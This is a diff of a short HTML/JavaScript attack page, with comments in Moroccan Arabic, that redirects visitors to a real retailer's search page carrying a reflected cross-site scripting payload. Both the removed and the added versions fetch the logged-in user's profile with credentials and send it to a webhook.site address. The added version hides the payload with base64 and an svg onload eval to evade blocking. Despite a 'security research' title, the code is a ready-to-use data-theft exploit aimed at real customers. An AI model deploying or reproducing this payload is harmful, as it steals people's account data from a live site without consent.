@@ -1,18 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Security Research - Impact Demonstration</title>
-</head>
-<body>
-    <h1>Redirecting to Secure Session...</h1>
-    <script>
-        // الرابط اللي فيه الـ Payload ديالك
-        // ملاحظة: خاص الـ Payload يكون Encoded باش السيرفر يقبلو
-        var target_url = "https://www.decathlon.com/search?q=";
-        var xss_payload = "<script>fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(d)))<\/script>";
-
-        // تحويل الضحية أوتوماتيكيا لصفحة البحث اللي فيها الثغرة
-        window.location.href = target_url + encodeURIComponent(xss_payload);
-    </script>
-</body>
-</html>
+<script>
+    // هاد الكود كيدير الـ Payload بـ رموز ما كيبلكيهاش المتصفح
+    // الهدف: يدخل لـ Decathlon، ينفذ الـ XSS، ويصيفط الداتا لـ Webhook
+    
+    let payload = "fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(d)))";
+    
+    // تحويل الكود لـ URL safe
+    let target = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + btoa(payload) + "'))>";
+    
+    window.location.href = target;
+</script>
